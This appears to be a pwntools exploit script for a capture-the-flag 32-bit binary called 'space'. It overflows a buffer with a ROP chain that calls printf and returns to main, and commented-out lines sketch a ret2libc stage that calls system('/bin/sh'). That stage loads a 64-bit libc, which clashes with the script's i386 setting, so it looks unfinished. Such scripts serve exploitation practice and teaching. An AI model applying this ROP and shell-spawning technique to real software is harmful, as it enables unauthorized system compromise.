from pwn import *

context.terminal = ['tmux', 'splitw', '-h', '-d']
context.arch = 'i386'

elf = ELF('space', checksec=0)

if True:
    # proc = gdb.debug(elf.path, '\n'.join([
    #     'c'
    # ]))
    proc = elf.process()
    gdb.attach(proc, '\n'.join([
        'break *0x080491ce', # ret in vuln
        'break fflush',
        'c'
    ]))
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=0)
else: 
    pass

rop1 = ROP([elf])
print(hex(elf.symbols['printf']))
# rop1.call(elf.symbols['fflush'])
rop1.call(elf.symbols['printf'], [next(elf.search(b'> \x00'))])
rop1.call(0x080491cf) # top of main
# rop1.call(0x080491fb) # just before fflush
# rop1.call(elf.symbols['main'])

padding = b'a' * 18
payload = padding + rop1.chain()
print(f'Payload is {len(payload)} long')
proc.send(payload)

# marker = b'\n\x1b[1;6;32m\nYou can add these'
# result = proc.recvuntil(marker)
# print(f'Read the following: {[result]}')

# offset_addr_raw = result[-6 - len(marker): -len(marker)].ljust(8, b'\x00')
# offset_addr = u64(offset_addr_raw)
# print(f'Found offset address {offset_addr_raw}  -->  {hex(offset_addr)}')

# libc.address = offset_addr - libc.symbols['puts']
# print(f'Found libc at {hex(libc.address)}')


# rop2 = ROP([libc])
# rop2.call(libc.symbols['puts'], [next(libc.search(b'/bin/sh'))])
# rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
# proc.send(padding + rop2.chain())

proc.interactive()
